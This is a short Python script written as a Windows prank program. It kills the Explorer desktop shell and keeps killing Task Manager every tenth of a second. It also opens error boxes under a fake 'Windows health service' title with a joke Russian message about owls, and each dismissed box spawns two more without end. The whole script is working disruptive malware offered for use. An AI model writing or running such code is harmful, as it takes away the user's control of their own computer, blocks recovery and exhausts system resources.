# program is in russian btw but if someone will help me to detect windows language and show error in that language i'd add it
import ctypes
import psutil
import os
import time
import threading

def kill_taskmgr():
    while True:
        for proc in psutil.process_iter():
            if proc.name() == "Taskmgr.exe":
                proc.kill()
        time.sleep(0.1)

def show_error():
    ctypes.windll.user32.MessageBoxW(0, 
        "Внимание! Совы Ани Таро в вашем Компьютере!!!!! Совы также продали диспетчер задач на базаре, и сьели рабочий стол на завтрак!!!!!!!", 
        "Служба узла: Служба Работоспособности Windows", 
        0x0 | 0x10) 
    
    for _ in range(2):
        threading.Thread(target=show_error).start()

os.system("taskkill /f /im explorer.exe")

threading.Thread(target=kill_taskmgr, daemon=True).start()

show_error()

while True:
    time.sleep(1)
